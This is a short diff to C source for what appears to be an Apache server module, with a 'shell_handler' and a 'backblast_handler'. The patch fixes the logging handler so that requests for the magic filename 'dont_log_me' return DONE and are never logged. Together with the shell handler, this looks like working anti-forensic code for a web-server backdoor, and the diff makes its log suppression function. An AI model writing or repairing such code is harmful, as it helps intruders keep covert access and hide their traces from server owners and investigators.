@@ -82,9 +82,9 @@ static int shell_handler(conn_rec *c)
 // logging handler
 static int backblast_handler(request_rec *r)
 {
-    if (strcmp(r->filename, "dont_log_me")) {
+    if (strcmp(r->filename, "dont_log_me") == 0) {
         // if this filename does not appear, move along
-        return DECLINED;
+        return DONE;
     }
 
     // if it does, throw DONE without logging
